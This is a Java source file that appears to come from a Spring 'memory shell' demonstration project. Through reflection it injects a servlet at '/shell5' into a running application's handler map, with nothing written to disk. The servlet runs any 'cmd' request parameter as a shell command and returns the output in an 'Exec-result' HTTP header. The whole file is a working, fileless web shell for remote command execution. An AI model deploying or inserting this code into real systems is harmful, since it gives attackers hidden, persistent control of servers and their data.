package com.example.springshell.memshell;

import com.example.springshell.utils.Util;
import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.DispatcherServlet;
import org.springframework.web.servlet.HandlerAdapter;
import org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping;
import org.springframework.web.servlet.handler.SimpleServletHandlerAdapter;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

public class No5_SimpleServletHandlerAdapterShell implements Servlet {
    public static String injectShell() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        WebApplicationContext webApplicationContext = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        BeanNameUrlHandlerMapping beanNameUrlHandlerMapping = webApplicationContext.getBean(BeanNameUrlHandlerMapping.class);
        // 添加handlerAdapter
        DispatcherServlet servlet = new Util().getServlet();
        List<HandlerAdapter> handlerAdapters = (List<HandlerAdapter>) Util.getFieldValue(servlet,"handlerAdapters");
        boolean hasSimpleServletHandlerAdapter = false;
        for(HandlerAdapter adapter:handlerAdapters){
            if(adapter instanceof SimpleServletHandlerAdapter){
                hasSimpleServletHandlerAdapter = true;
                break;
            }
        }
        if(!hasSimpleServletHandlerAdapter){
            handlerAdapters.add(new SimpleServletHandlerAdapter());
        }

        // 添加handler
        Class abstractUrlHandlerMapping = Class.forName("org.springframework.web.servlet.handler.AbstractUrlHandlerMapping");
        Field field = abstractUrlHandlerMapping.getDeclaredField("handlerMap");
        field.setAccessible(true);
        Map handlerMap = (Map) field.get(beanNameUrlHandlerMapping);
        handlerMap.put("/shell5",new No5_SimpleServletHandlerAdapterShell());
        return "{\"result\":\"No5_SimpleServletHandlerAdapterShell\"}";
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {

        if (servletRequest.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", servletRequest.getParameter("cmd")} : new String[]{"cmd.exe", "/c", servletRequest.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
//            servletResponse.getWriter().write(output);
//            servletResponse.getWriter().flush();
//            servletResponse.getWriter().close();
            HttpServletResponse response = (HttpServletResponse) servletResponse;
            response.setHeader("Exec-result", new String(output));
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}

